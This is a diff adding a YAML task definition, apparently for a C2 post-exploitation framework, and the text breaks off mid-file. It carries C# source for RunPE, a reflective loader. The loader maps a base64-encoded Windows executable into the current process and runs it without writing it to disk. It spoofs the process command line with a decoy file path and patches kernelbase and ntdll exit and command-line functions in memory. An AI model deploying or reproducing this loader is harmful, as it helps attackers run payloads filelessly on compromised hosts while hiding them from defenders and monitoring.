@@ -1,0 +1,1664 @@
+- Author:
+    Name: Jann
+    Handle: '@jannlemm0913'
+    Link: https://avantguard.io
+  Name: RunPE
+  Aliases: []
+  Description: Reflective loader for unmanaged binaries.
+  Help: >-
+    All credits go to nettitude.
+
+
+    https://github.com/nettitude/RunPE
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Collections.Generic;
+
+    using System.Diagnostics;
+
+    using System.IO;
+
+    using System.Linq;
+
+    using System.Runtime.ConstrainedExecution;
+
+    using System.Runtime.InteropServices;
+
+    using System.Security;
+
+    using System.Text;
+
+    using System.Threading.Tasks;
+
+    using System.Threading;
+
+
+    using RunPE.Helpers;
+
+    using RunPE.Internals;
+
+    using RunPE.Patchers;
+
+
+
+    public static class Task
+
+    {
+        public static string output = "";
+
+        public static string Execute(string DecoyFilePath, string FileContents, string Arguments)
+        {
+            try
+            {
+                string b64_arguments = Convert.ToBase64String(Encoding.UTF8.GetBytes(Arguments));
+                string[] passed_args = { DecoyFilePath, FileContents, b64_arguments };
+                int returncode = RunPE.Program.Main(passed_args);
+                if(returncode != 0)
+                {
+                    return output + "\n----------------\n\n[-] RunPE failed";
+                }
+                else
+                {
+                    return output + "\n------------------\n\n[+] RunPE finished";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+
+
+    namespace RunPE
+
+    {
+        static class Program
+        {
+            private const uint EXECUTION_TIMEOUT = 30000;
+
+            internal static Encoding encoding;
+
+            public static int Main(string[] args)
+            {
+                try
+                {
+                    if (IntPtr.Size != 8)
+                    {
+                        Task.output += ("\n[-] Process is not 64-bit, this version of RunPE won't work!\n");
+                        return -1;
+                    }
+                    else
+
+                    if (args.Length == 0)
+                    {
+                        Task.output += "\n[-] Something went wrong with the arguments (length is 0)!\n";
+                        return -2;
+                    }
+
+                    var peRunDetails = ParseArgs(args.ToList());
+
+                    if (peRunDetails == null)
+                    {
+                        return -10;
+                    }
+
+                    var peMapper = new PEMapper();
+                    peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);
+
+                    var importResolver = new ImportResolver();
+                    importResolver.ResolveImports(pe, currentBase);
+
+                    peMapper.SetPagePermissions();
+
+                    var argumentHandler = new ArgumentHandler();
+                    if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
+                    {
+                        return -3;
+                    }
+
+                    var fileDescriptorRedirector = new FileDescriptorRedirector();
+                    if (!fileDescriptorRedirector.RedirectFileDescriptors())
+                    {
+                        Task.output += ("\n[-] Unable to redirect file descriptors\n");
+                        return -7;
+                    }
+
+                    var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
+                    extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();
+
+                    // Patch this last as may interfere with other activity
+                    var extraAPIPatcher = new ExtraAPIPatcher();
+
+                    if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
+                    {
+                        return -9;
+                    }
+
+                    var exitPatcher = new ExitPatcher();
+                    if (!exitPatcher.PatchExit())
+                    {
+                        return -8;
+                    }
+
+                    fileDescriptorRedirector.StartReadFromPipe();
+
+                    StartExecution(peRunDetails.args, pe, currentBase);
+
+                    // Revert changes
+                    exitPatcher.ResetExitFunctions();
+                    extraAPIPatcher.RevertAPIs();
+                    extraEnvironmentalPatcher.RevertExtraPatches();
+                    fileDescriptorRedirector.ResetFileDescriptors();
+                    argumentHandler.ResetArgs();
+                    peMapper.ClearPE();
+                    importResolver.ResetImports();
+
+                    // Print the output
+                    Task.output = fileDescriptorRedirector.ReadDescriptorOutput();
+                    return 0;
+                }
+                catch (Exception e)
+                {
+                    Task.output += ($"\n[-] Error running RunPE: {e}");
+                    return -6;
+                }
+            }
+
+            private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
+            {
+                try
+                {
+                    var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
+                    var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
+
+                    NativeDeclarations.WaitForSingleObject(hThread, EXECUTION_TIMEOUT);
+                }
+                catch (Exception e)
+                {
+                    Task.output += ($"\n[-] Error {e}\n");
+                }
+            }
+
+            private static PeRunDetails ParseArgs(List<string> args)
+            {
+                string filename;
+                string[] binaryArgs;
+                byte[] binaryBytes;
+
+                filename = args[0];
+
+                binaryBytes = Convert.FromBase64String(args[1]);
+
+                if (args.Count > 2)
+                {
+                    binaryArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[2])).Split();
+                }
+                else
+                {
+                    binaryArgs = new string[] { };
+                }
+                return new PeRunDetails { filename = filename, args = binaryArgs, binaryBytes = binaryBytes };
+            }
+        }
+
+        internal class PeRunDetails
+        {
+            internal string filename;
+            internal string[] args;
+            internal byte[] binaryBytes;
+        }
+    }
+
+
+    namespace RunPE.Helpers
+
+    {
+        internal static class Utils
+        {
+            internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
+            {
+                var moduleHandle = NativeDeclarations.GetModuleHandle(dllName);
+                var pFunc = NativeDeclarations.GetProcAddress(moduleHandle, funcName);
+                var originalBytes = new byte[patchBytes.Length];
+                Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);
+
+                var result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
+                if (!result)
+                {
+                    return null;
+                }
+                Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);
+
+                result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
+                if (!result)
+                {
+
+                }
+                return originalBytes;
+            }
+
+            internal static bool PatchAddress(IntPtr pAddress, IntPtr newValue)
+            {
+                var result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size,
+                    NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
+                if (!result)
+                {
+                    return false;
+                }
+
+                Marshal.WriteIntPtr(pAddress, newValue);
+                result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size, oldProtect, out _);
+                if (!result)
+                {
+                    return false;
+                }
+                return true;
+            }
+
+            internal static bool ZeroOutMemory(IntPtr start, int length)
+            {
+                var result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, NativeDeclarations.PAGE_READWRITE,
+                    out var oldProtect);
+                if (!result)
+                {
+
+                }
+
+                var zeroes = new byte[length];
+                for (var i = 0; i < zeroes.Length; i++)
+                {
+                    zeroes[i] = 0x00;
+                }
+
+                Marshal.Copy(zeroes.ToArray(), 0, start, length);
+
+                result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, oldProtect, out _);
+                if (!result)
+                {
+                    return false;
+                }
+
+                return true;
+            }
+
+            internal static void FreeMemory(IntPtr address)
+            {
+                NativeDeclarations.VirtualFree(address, 0, NativeDeclarations.MEM_RELEASE);
+            }
+
+            internal static IntPtr GetPointerToPeb()
+            {
+                var currentProcessHandle = NativeDeclarations.GetCurrentProcess();
+                var processBasicInformation =
+                    Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)));
+                var outSize = Marshal.AllocHGlobal(sizeof(long));
+                var pPEB = IntPtr.Zero;
+
+                var result = NativeDeclarations.NtQueryInformationProcess(currentProcessHandle, 0, processBasicInformation,
+                    (uint)Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)), outSize);
+
+                NativeDeclarations.CloseHandle(currentProcessHandle);
+                Marshal.FreeHGlobal(outSize);
+
+                if (result == 0)
+                {
+                    pPEB = ((NativeDeclarations.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processBasicInformation,
+                        typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION))).PebAddress;
+                }
+                else
+                {
+                    Task.output += $"\n[-] Unable to NtQueryInformationProcess, error code: {result}\n";
+                    var error = NativeDeclarations.GetLastError();
+                    Task.output += $"\n[-] GetLastError: {error}\n";
+                }
+                Marshal.FreeHGlobal(processBasicInformation);
+                return pPEB;
+            }
+
+            public static byte[] ReadMemory(IntPtr address, int length)
+            {
+                var bytes = new byte[length];
+                Marshal.Copy(address, bytes, 0, length);
+                return bytes;
+            }
+        }
+    }
+
+
+    namespace RunPE.Internals
+
+    {
+        internal static unsafe class NativeDeclarations
+        {
+            internal const uint PAGE_EXECUTE_READWRITE = 0x40;
+            internal const uint PAGE_READWRITE = 0x04;
+            internal const uint PAGE_EXECUTE_READ = 0x20;
+            internal const uint PAGE_EXECUTE = 0x10;
+            internal const uint PAGE_EXECUTE_WRITECOPY = 0x80;
+            internal const uint PAGE_NOACCESS = 0x01;
+            internal const uint PAGE_READONLY = 0x02;
+            internal const uint PAGE_WRITECOPY = 0x08;
+
+            internal const uint MEM_COMMIT = 0x1000;
+            internal const uint MEM_RELEASE = 0x00008000;
+
+            internal const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
+            internal const uint IMAGE_SCN_MEM_READ = 0x40000000;
+            internal const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
+
+            [StructLayout(LayoutKind.Sequential)]
+            internal struct IMAGE_BASE_RELOCATION
+            {
+                internal uint VirtualAdress;
+                internal uint SizeOfBlock;
+            }
+
+            [DllImport("kernel32.dll")]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            internal static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
+
+            [DllImport("kernel32.dll")]
+            internal static extern uint GetLastError();
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            internal static extern IntPtr GetStdHandle(int nStdHandle);
+
+            [StructLayout(LayoutKind.Sequential)]
+            internal struct SECURITY_ATTRIBUTES
+            {
+                internal int nLength;
+                internal byte* lpSecurityDescriptor;
+                internal int bInheritHandle;
+            }
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            internal static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
+                uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+
+            [DllImport("kernel32.dll")]
+            internal static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
+                ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+
+            [DllImport("ntdll.dll", SetLastError = true)]
+            internal static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
+                IntPtr processInformation, uint processInformationLength, IntPtr returnLength);
+
+            [DllImport("kernel32")]
+            internal static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType,
+                uint flProtect);
+
+            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            internal static extern IntPtr LoadLibrary(string lpFileName);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            internal static extern IntPtr GetCurrentProcess();
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+            internal static extern IntPtr GetCommandLine();
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
+            [SuppressUnmanagedCodeSecurity]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            internal static extern bool CloseHandle(IntPtr hObject);
+
+            [DllImport("kernel32")]
+            internal static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
+                IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
+
+            [DllImport("kernel32.dll")]
+            internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
+                out uint lpFlOldProtect);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+            internal static extern IntPtr GetModuleHandle(string lpModuleName);
+
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            internal static extern bool VirtualFree(IntPtr pAddress, uint size, uint freeType);
+
+            [DllImport("kernel32")]
+            internal static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+            [StructLayout(LayoutKind.Sequential)]
+            internal struct PROCESS_BASIC_INFORMATION
+            {
+                internal uint ExitStatus;
+                internal IntPtr PebAddress;
+                internal UIntPtr AffinityMask;
+                internal int BasePriority;
+                internal UIntPtr UniqueProcessId;
+                internal UIntPtr InheritedFromUniqueProcessId;
+            }
+        }
+    }
+
+
+    namespace RunPE.Internals
+
+    {
+        public class PELoader
+        {
+            public struct IMAGE_DOS_HEADER
+            {
+                // DOS .EXE header
+                public ushort e_magic; // Magic number
+                public ushort e_cblp; // Bytes on last page of file
+                public ushort e_cp; // Pages in file
+                public ushort e_crlc; // Relocations
+                public ushort e_cparhdr; // Size of header in paragraphs
+                public ushort e_minalloc; // Minimum extra paragraphs needed
+                public ushort e_maxalloc; // Maximum extra paragraphs needed
+                public ushort e_ss; // Initial (relative) SS value
+                public ushort e_sp; // Initial SP value
+                public ushort e_csum; // Checksum
+                public ushort e_ip; // Initial IP value
+                public ushort e_cs; // Initial (relative) CS value
+                public ushort e_lfarlc; // File address of relocation table
+                public ushort e_ovno; // Overlay number
+                public ushort e_res_0; // Reserved words
+                public ushort e_res_1; // Reserved words
+                public ushort e_res_2; // Reserved words
+                public ushort e_res_3; // Reserved words
+                public ushort e_oemid; // OEM identifier (for e_oeminfo)
+                public ushort e_oeminfo; // OEM information; e_oemid specific
+                public ushort e_res2_0; // Reserved words
+                public ushort e_res2_1; // Reserved words
+                public ushort e_res2_2; // Reserved words
+                public ushort e_res2_3; // Reserved words
+                public ushort e_res2_4; // Reserved words
+                public ushort e_res2_5; // Reserved words
+                public ushort e_res2_6; // Reserved words
+                public ushort e_res2_7; // Reserved words
+                public ushort e_res2_8; // Reserved words
+                public ushort e_res2_9; // Reserved words
+                public uint e_lfanew; // File address of new exe header
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            public struct IMAGE_DATA_DIRECTORY
+            {
+                public uint VirtualAddress;
+                public uint Size;
+            }
+
+            [StructLayout(LayoutKind.Sequential, Pack = 1)]
+            public struct IMAGE_OPTIONAL_HEADER32
+            {
+                public ushort Magic;
+                public byte MajorLinkerVersion;
+                public byte MinorLinkerVersion;
+                public uint SizeOfCode;
+                public uint SizeOfInitializedData;
+                public uint SizeOfUninitializedData;
+                public uint AddressOfEntryPoint;
+                public uint BaseOfCode;
+                public uint BaseOfData;
+                public uint ImageBase;
+                public uint SectionAlignment;
+                public uint FileAlignment;
+                public ushort MajorOperatingSystemVersion;
+                public ushort MinorOperatingSystemVersion;
+                public ushort MajorImageVersion;
+                public ushort MinorImageVersion;
+                public ushort MajorSubsystemVersion;
+                public ushort MinorSubsystemVersion;
+                public uint Win32VersionValue;
+                public uint SizeOfImage;
+                public uint SizeOfHeaders;
+                public uint CheckSum;
+                public ushort Subsystem;
+                public ushort DllCharacteristics;
+                public uint SizeOfStackReserve;
+                public uint SizeOfStackCommit;
+                public uint SizeOfHeapReserve;
+                public uint SizeOfHeapCommit;
+                public uint LoaderFlags;
+                public uint NumberOfRvaAndSizes;
+
+                public IMAGE_DATA_DIRECTORY ExportTable;
+                public IMAGE_DATA_DIRECTORY ImportTable;
+                public IMAGE_DATA_DIRECTORY ResourceTable;
+                public IMAGE_DATA_DIRECTORY ExceptionTable;
+                public IMAGE_DATA_DIRECTORY CertificateTable;
+                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+                public IMAGE_DATA_DIRECTORY Debug;
+                public IMAGE_DATA_DIRECTORY Architecture;
+                public IMAGE_DATA_DIRECTORY GlobalPtr;
+                public IMAGE_DATA_DIRECTORY TLSTable;
+                public IMAGE_DATA_DIRECTORY LoadConfigTable;
+                public IMAGE_DATA_DIRECTORY BoundImport;
+                public IMAGE_DATA_DIRECTORY IAT;
+                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+                public IMAGE_DATA_DIRECTORY Reserved;
+            }
+
+            [StructLayout(LayoutKind.Sequential, Pack = 1)]
+            public struct IMAGE_OPTIONAL_HEADER64
+            {
+                public ushort Magic;
+                public byte MajorLinkerVersion;
+                public byte MinorLinkerVersion;
+                public uint SizeOfCode;
+                public uint SizeOfInitializedData;
+                public uint SizeOfUninitializedData;
+                public uint AddressOfEntryPoint;
+                public uint BaseOfCode;
+                public ulong ImageBase;
+                public uint SectionAlignment;
+                public uint FileAlignment;
+                public ushort MajorOperatingSystemVersion;
+                public ushort MinorOperatingSystemVersion;
+                public ushort MajorImageVersion;
+                public ushort MinorImageVersion;
+                public ushort MajorSubsystemVersion;
+                public ushort MinorSubsystemVersion;
+                public uint Win32VersionValue;
+                public uint SizeOfImage;
+                public uint SizeOfHeaders;
+                public uint CheckSum;
+                public ushort Subsystem;
+                public ushort DllCharacteristics;
+                public ulong SizeOfStackReserve;
+                public ulong SizeOfStackCommit;
+                public ulong SizeOfHeapReserve;
+                public ulong SizeOfHeapCommit;
+                public uint LoaderFlags;
+                public uint NumberOfRvaAndSizes;
+
+                public IMAGE_DATA_DIRECTORY ExportTable;
+                public IMAGE_DATA_DIRECTORY ImportTable;
+                public IMAGE_DATA_DIRECTORY ResourceTable;
+                public IMAGE_DATA_DIRECTORY ExceptionTable;
+                public IMAGE_DATA_DIRECTORY CertificateTable;
+                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+                public IMAGE_DATA_DIRECTORY Debug;
+                public IMAGE_DATA_DIRECTORY Architecture;
+                public IMAGE_DATA_DIRECTORY GlobalPtr;
+                public IMAGE_DATA_DIRECTORY TLSTable;
+                public IMAGE_DATA_DIRECTORY LoadConfigTable;
+                public IMAGE_DATA_DIRECTORY BoundImport;
+                public IMAGE_DATA_DIRECTORY IAT;
+                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+                public IMAGE_DATA_DIRECTORY Reserved;
+            }
+
+            [StructLayout(LayoutKind.Sequential, Pack = 1)]
+            public struct IMAGE_FILE_HEADER
+            {
+                public ushort Machine;
+                public ushort NumberOfSections;
+                public uint TimeDateStamp;
+                public uint PointerToSymbolTable;
+                public uint NumberOfSymbols;
+                public ushort SizeOfOptionalHeader;
+                public ushort Characteristics;
+            }
+
+            [StructLayout(LayoutKind.Explicit)]
+            public struct IMAGE_SECTION_HEADER
+            {
+                [FieldOffset(0)]
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+                public char[] Name;
+
+                [FieldOffset(8)] public uint VirtualSize;
+                [FieldOffset(12)] public uint VirtualAddress;
+                [FieldOffset(16)] public uint SizeOfRawData;
+                [FieldOffset(20)] public uint PointerToRawData;
+                [FieldOffset(24)] public uint PointerToRelocations;
+                [FieldOffset(28)] public uint PointerToLinenumbers;
+                [FieldOffset(32)] public ushort NumberOfRelocations;
+                [FieldOffset(34)] public ushort NumberOfLinenumbers;
+                [FieldOffset(36)] public DataSectionFlags Characteristics;
+            }
+
+            [Flags]
+            public enum DataSectionFlags : uint
+            {
+                Stub = 0x00000000,
+            }
+
+            private IMAGE_DOS_HEADER dosHeader;
+            private IMAGE_FILE_HEADER fileHeader;
+            private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
+            private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
+            private IMAGE_SECTION_HEADER[] imageSectionHeaders;
+            private byte[] rawbytes;
+
+            public PELoader(byte[] fileBytes)
+            {
+                // Read in the DLL or EXE and get the timestamp
+                using (var stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
+                {
+                    var reader = new BinaryReader(stream);
+                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+
+                    // Add 4 bytes to the offset
+                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+
+                    var ntHeadersSignature = reader.ReadUInt32();
+                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+                    if (Is32BitHeader)
+                    {
+                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+                    }
+                    else
+                    {
+                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+                    }
+
+                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+                    for (var headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+                    {
+                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+                    }
+
+                    rawbytes = fileBytes;
+                }
+            }
+
+            public static T FromBinaryReader<T>(BinaryReader reader)
+            {
+                // Read in a byte array
+                var bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
+
+                // Pin the managed memory while, copy it out the data, then unpin it
+                var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+                var theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
+                handle.Free();
+
+                return theStructure;
+            }
+
+            public bool Is32BitHeader
+            {
+                get
+                {
+                    ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
+                    return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
+                }
+            }
+
+            public IMAGE_FILE_HEADER FileHeader
+            {
+                get { return fileHeader; }
+            }
+
+            /// Gets the optional header
+            public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
+            {
+                get { return optionalHeader64; }
+            }
+
+            public IMAGE_SECTION_HEADER[] ImageSectionHeaders
+            {
+                get { return imageSectionHeaders; }
+            }
+
+            public byte[] RawBytes
+            {
+                get { return rawbytes; }
+            }
+        }
+    }
+
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class ArgumentHandler
+        {
+            private const int PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET = 0x20;
+            private const int RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET = 0x70;
+            private const int RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET = 2;
+            private const int RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET = 0x60;
+            private const int UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET = 0x8;
+
+            private byte[] _originalCommandLineFuncBytes;
+            private IntPtr _ppCommandLineString;
+            private IntPtr _ppImageString;
+            private IntPtr _pLength;
+            private IntPtr _pMaxLength;
+            private IntPtr _pOriginalCommandLineString;
+            private IntPtr _pOriginalImageString;
+            private IntPtr _pNewString;
+            private short _originalLength;
+            private short _originalMaxLength;
+            private string _commandLineFunc;
+            private Encoding _encoding;
+
+            public bool UpdateArgs(string filename, string[] args)
+            {
+                var pPEB = Utils.GetPointerToPeb();
+                if (pPEB == IntPtr.Zero)
+                {
+                    return false;
+                }
+
+                GetPebCommandLineAndImagePointers(pPEB, out _ppCommandLineString, out _pOriginalCommandLineString,
+                    out _ppImageString, out _pOriginalImageString, out _pLength, out _originalLength, out _pMaxLength,
+                    out _originalMaxLength);
+
+                var newCommandLineString = $"\"{filename}\" {string.Join(" ", args)}";
+                var pNewCommandLineString = Marshal.StringToHGlobalUni(newCommandLineString);
+                var pNewImageString = Marshal.StringToHGlobalUni(filename);
+
+                if (!Utils.PatchAddress(_ppCommandLineString, pNewCommandLineString))
+                {
+                    return false;
+                }
+
+                if (!Utils.PatchAddress(_ppImageString, pNewImageString))
+                {
+                    return false;
+                }
+                Marshal.WriteInt16(_pLength, 0, (short)newCommandLineString.Length);
+                Marshal.WriteInt16(_pMaxLength, 0, (short)newCommandLineString.Length);
+
+                if (!PatchGetCommandLineFunc(newCommandLineString))
+                {
+                    return false;
+                }
+                return true;
+            }
+
+            private bool PatchGetCommandLineFunc(string newCommandLineString)
+            {
+                var pCommandLineString = NativeDeclarations.GetCommandLine();
+                var commandLineString = Marshal.PtrToStringAuto(pCommandLineString);
+
+                _encoding = Encoding.UTF8;
+
+                if (commandLineString != null)
+                {
+                    var stringBytes = new byte[commandLineString.Length];
+
+                    // Copy the command line string bytes into an array and check if it contains null bytes (so if it is wide or not
+                    Marshal.Copy(pCommandLineString, stringBytes, 0,
+                        commandLineString.Length); // Even if ASCII won't include null terminating byte
+
+                    if (!new List<byte>(stringBytes).Contains(0x00))
+                    {
+                        _encoding = Encoding.ASCII; // At present assuming either ASCII or UTF8
+                    }
+
+                    Program.encoding = _encoding;
+                }
+
+                // Set the GetCommandLine func based on the determined encoding
+                _commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW";
+
+                // Write the new command line string into memory
+                _pNewString = _encoding.Equals(Encoding.ASCII)
+                    ? Marshal.StringToHGlobalAnsi(newCommandLineString)
+                    : Marshal.StringToHGlobalUni(newCommandLineString);
+                // Create the patch bytes that provide the new string pointer
+                var patchBytes = new List<byte> { 0x48, 0xB8 }; // TODO architecture
+                var pointerBytes = BitConverter.GetBytes(_pNewString.ToInt64());
+
+                patchBytes.AddRange(pointerBytes);
+
+                patchBytes.Add(0xC3);
+
+                // Patch the GetCommandLine function to return the new string
+                _originalCommandLineFuncBytes = Utils.PatchFunction("kernelbase", _commandLineFunc, patchBytes.ToArray());
+                if (_originalCommandLineFuncBytes == null)
+                {
+                    return false;
+                }
+                return true;
+            }
+
+            private static void GetPebCommandLineAndImagePointers(IntPtr pPEB, out IntPtr ppCommandLineString,
+                out IntPtr pCommandLineString, out IntPtr ppImageString, out IntPtr pImageString,
+                out IntPtr pCommandLineLength, out short commandLineLength, out IntPtr pCommandLineMaxLength,
+                out short commandLineMaxLength)
+            {
+                var ppRtlUserProcessParams = (IntPtr)(pPEB.ToInt64() + PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET);
+                var pRtlUserProcessParams = Marshal.ReadInt64(ppRtlUserProcessParams);
+
+                ppCommandLineString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
+                                      UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
+                pCommandLineString = (IntPtr)Marshal.ReadInt64(ppCommandLineString);
+
+                ppImageString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET +
+                                UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
+                pImageString = (IntPtr)Marshal.ReadInt64(ppImageString);
+
+                pCommandLineLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET;
+                commandLineLength = Marshal.ReadInt16(pCommandLineLength);
+
+                pCommandLineMaxLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
+                                        RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET;
+                commandLineMaxLength = Marshal.ReadInt16(pCommandLineMaxLength);
+            }
+
+            internal void ResetArgs()
+            {
+                if (Utils.PatchFunction("kernelbase", _commandLineFunc, _originalCommandLineFuncBytes) == null)
+                {
+
+                }
+
+                if (!Utils.PatchAddress(_ppCommandLineString, _pOriginalCommandLineString))
+                {
+
+                }
+
+                if (!Utils.PatchAddress(_ppImageString, _pOriginalImageString))
+                {
+
+                }
+                Marshal.WriteInt16(_pLength, 0, _originalLength);
+                Marshal.WriteInt16(_pMaxLength, 0, _originalMaxLength);
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class ExitPatcher
+        {
+            private byte[] _terminateProcessOriginalBytes;
+            private byte[] _ntTerminateProcessOriginalBytes;
+            private byte[] _rtlExitUserProcessOriginalBytes;
+            private byte[] _corExitProcessOriginalBytes;
+
+            public bool PatchExit()
+            {
+                var hKernelbase = NativeDeclarations.GetModuleHandle("kernelbase");
+                var pExitThreadFunc = NativeDeclarations.GetProcAddress(hKernelbase, "ExitThread");
+
+                var exitThreadPatchBytes = new List<byte> { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
+
+                var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());
+
+                exitThreadPatchBytes.AddRange(pointerBytes);
+
+                exitThreadPatchBytes.Add(0x50);
+                exitThreadPatchBytes.Add(0xC3);
+
+                _terminateProcessOriginalBytes =
+                    Utils.PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
+                if (_terminateProcessOriginalBytes == null)
+                {
+                    return false;
+                }
+
+                _corExitProcessOriginalBytes =
+                    Utils.PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
+                if (_corExitProcessOriginalBytes == null)
+                {
+                    return false;
+                }
+
+                _ntTerminateProcessOriginalBytes =
+                    Utils.PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
+                if (_ntTerminateProcessOriginalBytes == null)
+                {
+                    return false;
+                }
+
+                _rtlExitUserProcessOriginalBytes =
+                    Utils.PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
+                if (_rtlExitUserProcessOriginalBytes == null)
+                {
+                    return false;
+                }
+                return true;
+            }
+
+            internal void ResetExitFunctions()
+            {
+                Utils.PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
+                Utils.PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
+                Utils.PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
+                Utils.PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
